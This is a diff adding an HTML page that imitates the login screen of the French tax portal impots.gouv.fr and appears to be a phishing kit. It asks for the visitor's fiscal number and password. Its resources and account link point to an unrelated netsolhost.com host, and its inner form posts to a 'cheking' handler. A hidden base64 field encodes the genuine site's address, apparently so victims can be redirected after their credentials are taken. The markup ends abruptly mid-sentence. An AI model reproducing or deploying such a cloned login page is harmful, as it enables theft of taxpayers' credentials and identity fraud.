@@ -1,0 +1,155 @@
+
+<!DOCTYPE html>
+
+<html lang="fr">
+<!-- Dac: dpapusx025 -->
+<!-- Le: Fri May 11 14:12:35 2018 -->
+<!-- Le: 4009 -->
+<head>
+<!--<meta charset="utf-8" /> -->
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<meta content="app-id=505488770" name="apple-itunes-app"/>
+<meta content="telephone=no" name="format-detection"/>
+<link href="local_resources/css/2a2d7ee42e3a63c4298ba4f565bf933e.css" rel="stylesheet"/>
+<link href="local_resources/css/811791b3bb865bac6194f2d6b85577c9.css" rel="stylesheet"/>
+<link href="local_resources/css/c49f6b094381655ab9d815f030eecc73.css" rel="stylesheet"/>
+<link href="http://1111bb2.netsolhost.com//laaaarbi/logoimpo.png" rel="shortcut icon"/>
+<!--[if lt IE 9]>
+			<script src="/templates/js/Respond.js"> </script>
+			<script src="/templates/js/html5shiv-3.7.3.min.js"> </script>
+			<script>
+				document.createElement('header');
+				document.createElement('footer');
+				document.createElement('main');
+			</script>
+		<![endif]-->
+<title>Particuliers | authentification</title>
+</head>
+<body>
+<a class="sr-only sr-only-focusable" href="#contenu">Aller au contenu</a>
+<!--[if lt IE 9]>
+			<div class="alert alert-danger" role="alert">
+				<p>Vous utilisez une version obsol&egrave;te de votre navigateur</p>
+				<p>Son utilisation vous expose &agrave; des risques de s&eacute;curit&eacute; et vous prive de certaines fonctionnalit&eacute;s.</p>
+				<p>Nous vous invitons &agrave; utiliser <a href="http://windows.microsoft.com/fr-fr/internet-explorer/download-ie">une version plus r&eacute;cente </a>
+				ou un <a href="http://browsehappy.com/">autre navigateur</a>.</p>
+			</div>
+		<![endif]-->
+<div class="alert alert-danger erreur pasvisible" id="cookie_error" role="alert">
+<h3>Erreur de configuration : votre navigateur n'accepte pas les cookies.</h3>
+<br/>Pour accéder aux services en ligne, il vous faut au préalable <a href="http://www.accepterlescookies.com">les accepter.</a>
+</div>
+
+<div class="alert alert-danger erreur" role="alert">
+<h3>Erreur de configuration : JavaScript n'est pas activé dans votre navigateur.</h3>
+<br/>Pour accéder aux services en ligne, il vous faut au préalable <a href="http://www.enable-javascript.com/fr">activer JavaScript.</a>
+</div>
+
+<div class="container pasvisible" id="banniereSmart">
+<button aria-label="Fermer la bannière" class="close" onclick="addClassName(document.getElementById('banniereSmart'), 'pasvisible');" type="button">
+<span aria-hidden="true">×</span>
+</button>
+<a class="col-xs-3 col-sm-1" href="https://play.test.google.com/store/apps/details?id=fr.gouv.finances.smartphone.android" id="leStoreLogo">
+<!-- <img id="LogoSmartImage" src="/templates/images/Small-logoSMART.png" alt="TÃ©lÃ©charger l'app mobile" /> -->
+</a>
+<div class="col-xs-8 col-sm-10" id="banniereSmartTexte">
+<div class="row">
+					Téléchargez gratuitement l'app mobile Impots.gouv sur votre appareil.
+				</div>
+</div>
+</div>
+<header>
+<div class="container">
+<div class="row">
+<!--Le logo-->
+<a href="" id="portailpublic" target="_blank">
+<h1 class="text-hide col-xs-12 col-sm-6 col-lg-7" id="logo">Authentification</h1>
+</a>
+<ul class="col-xs-12 col-sm-6 col-lg-5" id="acces_espace">
+<li class="col-xs-6 col-sm-9 col-md-7 pull-right">
+<a class="btn btn-primary" href="http://1111bb2.netsolhost.com/monprofil-webapp/monCompte" id="partPriv">
+								Votre espace particulier
+							</a>
+</li>
+<li class="col-xs-6 col-sm-9 col-md-7 pull-right">
+<a class="btn btn-danger" href="" id="proPriv">
+								Votre espace professionnel
+							</a>
+</li>
+</ul>
+</div> <!-- Fin Row -->
+</div> <!-- Fin Container -->
+</header>
+<!-- Fil d'Arianne -->
+<div class="container">
+<div class="row">
+<ol class="breadcrumb">
+<li><a href="" id="toPortailPub" title="Retour au portail">Accueil</a></li>
+<li class="active">Authentification</li>
+</ol>
+</div>
+</div>
+<!-- Fin du fil d'Arianne -->
+<main class="container" id="contenu">
+<div class="row">
+<!-- Connexion Gauche-->
+<div class="col-md-6">
+<div class="panel panel-default">
+<div class="panel-heading">
+<h2 class="text-center">Connexion à mon espace particulier <a href="#" id="access_aide" title="Consulter la rubrique d'aide (ouverture d'une fenêtre de dialogue)"><span class="dgfipicon dgfipicon-info text-muted"></span></a></h2>
+</div>
+<!--===========================-->
+<!--Body Connexion Gauche DEBUT-->
+<!--===========================-->
+<div class="panel-body">
+<div class="erreur alert alert-danger pasvisible erreurDAC" id="Cat2Deco3">
+							 
+								À la suite d'un problème technique, veuillez vous reconnecter.
+							</div>
+<div class="erreur alert alert-danger pasvisible erreurDAC" id="Cat2Interdit">
+								Pour accéder au service demandé, vous devez utiliser votre identifiant et votre mot de passe.
+							</div>
+<div class="erreur alert alert-danger pasvisible erreurDAC" id="Cat2IndispoLMDP">
+								Le service est indisponible ; veuillez réitérer votre demande ultérieurement.
+							</div>
+<div class="erreur alert alert-danger pasvisible erreurDAC" id="Cat2LMDP"></div>
+<form enctype="application/x-www-form-urlencoded" id="LMDP_formulaire" method="post">
+<input name="url" type="hidden" value="aHR0cHM6Ly9jZnNwYXJ0LmltcG90cy5nb3V2LmZyLw=="/>
+<input id="LMDP_Spi" name="LMDP_Spi" type="hidden"/>
+<input id="LMDP_Password" name="LMDP_Password" type="hidden"/>
+<form action="cheking
+" class="form" method="post">
+<!--=================-->
+<!-- Identifiant SPI -->
+<!--=================-->
+<div class="row">
+<div class="col-md-12">
+<div class="form-group" id="fg_lmdp_spi">
+<label for="LMDP_Spi_tmp">Numéro fiscal :</label><div class="ephemere hidden" id="liveCheck_LMDP_Spi_tmp"></div>
+<input aria-required="true" autocomplete="on" class="form-control" data-mask="int" data-max="13" data-original-title="Ce numéro figure en haut de la première page de votre dernière déclaration de revenus." data-placement="top" data-toggle="tooltip" id="LMDP_Spi_tmp" name="LMDP_Spi_tmp" placeholder="" type="tel"/>
+</div> <!-- form-group -->
+<div class="erreur pasvisible alert alert-danger" id="Cat1_LMDP_Spi_tmp">Le format de votre numéro fiscal est incorrect. Seuls sont autorisés 13 caractères numériques.</div>
+</div>
+</div>
+<!--=======================-->
+<!-- Mot de passe + bouton -->
+<!--=======================-->
+<div class="row">
+<div class="col-md-12">
+<div class="form-group" id="fg_lmdp_pwd">
+<label for="LMDP_Password_tmp">Mot de passe</label>
+<div class="row">
+<div class="col-xs-7 col-sm-8">
+<input aria-required="true" autocomplete="off" class="form-control" data-placement="top" data-toggle="tooltip" id="LMDP_Password_tmp" maxlength="128" name="LMDP_Password_tmp" type="password"/>
+</div>
+<div class="col-xs-5 col-sm-4">
+<button class="btn btn-primary col-xs-12" onclick="document.getElementById('LMDP_formulaire').action = urlLoginMotDePasse ; return envoiLP();" type="submit">
+														Connexion
+													</button>
+</div>
+</div> <!-- fin ROW Mdp + Connexion -->
+</div> <!-- form-group -->
+<div class="erreur pasvisible alert alert-danger" id="Cat1_LMDP_Password_tmp">
+											Le format de votre mot de passe est incorrect. Il doit comporter 8 à 128 caractères dont une lettre et un chiffre.
+											Il peut aussi c</div></div></div></form></form></div></div></div></div></main></body></html>
